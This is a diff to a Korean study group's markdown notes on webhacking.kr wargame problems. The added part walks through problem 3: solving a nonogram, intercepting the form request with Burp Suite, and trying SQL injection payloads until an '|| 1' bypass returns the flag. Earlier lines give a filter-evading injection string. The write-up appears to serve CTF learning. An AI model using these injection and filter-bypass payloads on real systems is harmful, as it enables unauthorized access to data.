@@ -7,7 +7,7 @@
 - 구성원 : 김지연(소프16), 박지선(소프16), 한나라(정통16), 한영빈(소프16), 송지은(소프15)
 - 모임 시각 : 월요일 오후 6시 ~ 8시
 - 모임 장소 : 스스스 랩실
-- 푼 문제 : 1, 4, 6, 12, 14, 15, 16, 17, 24, 25, 26, 27, 32, 38, 49, 56
+- 푼 문제 : 1, 4, 6, 12, 14, 15, 16, 17, 18, 24, 25, 26, 27, 32, 38, 49, 56
 
 ## 1주차 모임
 - 2016.10.31
@@ -375,7 +375,7 @@ setTimeout("answer(0)",10000);
  - 김지연 :
  - 박지선 : 25
  - 한나라 :
- - 한영빈 :
+ - 한영빈 : 3
  - 송지은 : 32, 49
 
 ### 25번 문제
@@ -406,3 +406,84 @@ setTimeout("answer(0)",10000);
 - 필터링 되는 문자들을 우회하여 id를 admin으로 만드는 값을 lv에 입력해준다.
 - 0 or id=admin 을 필터링을 우회하여 입력
 - 0%0A||%0Aid=0x61646d696e 이런식으로 입력해주면 문제가 풀린다.
+
+### 3번 문제
+- 문제 페이지로 들어가면, 퍼즐이 하나 나오는데, `노노그램` 혹은 `네모네모로직` 이라는 퍼즐 게임이다.
+- 5 * 5 칸이 준비되어 있고, 각 가로줄이나 세로줄 위쪽이나 왼쪽에 숫자가 배열되어 있다.
+- 적혀있는 숫자의 수 만큼, 칸을 연속해서 칠해야 하며, 숫자가 둘 이상인 경우 칠해진 칸 사이에 빈칸이 하나 이상 있어야 한다.
+ - 예를 들어 1, 2 이면. 한칸 칠하고 최소 한칸 띄어서 두칸을 연속해서 칠해야 함
+- 해당 칸을 클릭해 칠하는 방식으로, 퍼즐을 풀면 아래와 같은 모양이 나온다. 그리고 `gogo` 를 눌러 다음 단계로 간다.
+
+```
+■□■□■
+□□□□□
+□■■■□
+□■□■□
+■■■■■
+```
+
+- 일일이 클릭하기 싫다면, 다음을 개발자콘솔의 콘솔 탭에서 실행한 후, `gogo` 를 눌러 다음 단계로 갈 수도 있다
+
+```javascript
+let one = [kk._1, kk._3, kk._5, kk._12, kk._13, kk._14, kk._17, kk._19, kk._21, kk._22, kk._23, kk._24, kk._25]
+one.forEach((item)=>{item.value=1})
+```
+
+- 이름 입력칸이 나오는데, 아무가나 넣고 클릭하면 아래와 같은 내용이 담긴 페이지가 나타난다.
+
+```
+Puzzle
+
+name : nnnn
+answer : 1010100000011100101011111
+ip : <IP Address>
+```
+
+- `answer` 값이 플래그인가? 하고 `Auth` 에 제출해 볼 수 있으나, 이는 플래그가 아니므로 틀렸다고 나온다.
+- `burpsuite` 를 이용해서 어떤 값이 전달되는지 알아보자.
+ - `burpsuite` 를 열고, Proxy 탭 으로 간 뒤, Options 탭으로 간다.
+ - Proxy Listener 에 아무 설정도 없다면 하나 추가하자. `Add` 를 누른다.
+ - `Bind to port` 를 `8080` 으로, `Bind to address` 는 `Loopback only` 로 선택한다. 그리고, `OK` 를 누른다.
+ - 추가한 항목의 `Running` 체크박스를 체크 상태로 변경한다.
+ - Proxy -> Intercept  로 간다. `Intercept is off` 를 눌러 `Intercept is on` 이 되도록 만든다.
+ - 사용중인 OS 의 프록시 설정을 변경하여, `burpsuite` 의 프록시 서버를 거치도록 설정한다. 주소는 `127.0.0.1`, 포트는 `8080` 으로 하면 된다.
+- 이제 다시 페이지로 돌아가서, 아까 입력칸에 나온 페이지에서 아무 값이나 넣고 버튼을 눌러보자. 필자는 `admin` 을 넣었다
+- 다음과 같은 `HTTP` 헤더와 바디가 `burpsuite` 에서 잡히는 것을 볼 수 있다.
+
+```
+POST /challenge/web/web-03/index.php HTTP/1.1
+Host: webhacking.kr
+Content-Length: 41
+Cache-Control: max-age=0
+Origin: http://webhacking.kr
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Referer: http://webhacking.kr/challenge/web/web-03/index.php?_1=1&_2=0&_3=1&_4=0&_5=1&_6=0&_7=0&_8=0&_9=0&_10=0&_11=0&_12=1&_13=1&_14=1&_15=0&_16=0&_17=1&_18=0&_19=1&_20=0&_21=1&_22=1&_23=1&_24=1&_25=1&_answer=1010100000011100101011111
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en-US;q=0.8,en;q=0.6,zh;q=0.4,zh-CN;q=0.2,zh-TW;q=0.2
+Cookie: PHPSESSID=660d2c9c6785948e67bf8851ed4eeea6
+Connection: close
+
+answer=1010100000011100101011111&id=admin
+```
+
+- `answer=1010100000011100101011111&id=admin` 부분에서 `...111` 과 `&id=admin` 사이에 뭔가를 삽입해서 SQL Injection 을 시도해 보자.
+- `"`,`'`,`or 1=1`, 등을 조합하여 넣어 시도해 보자.
+
+| 수정된 값 | 서버로 전송한 결과
+--- | ---
+`answer=1010100000011100101011111"&id=admin` | `query error!`
+`answer=1010100000011100101011111'&id=admin` | `no hack`
+`answer=1010100000011100101011111" or 1&id=admin` | `no hack`
+`answer=1010100000011100101011111" or 1=1 &id=admin` | `no hack`
+`answer=1010100000011100101011111=&id=admin` | `no hack`
+`answer=1010100000011100101011111 || 1&id=admin` | 플래그가 나옴
+
+- SQL Injection 에 성공한 경우, 아래과 같은 내용이 나타난다. 그 중 `answer` 값이 플래그 이므로 제출하면 된다.
+```
+name : admin
+answer : <flag>
+ip : localhost
+```
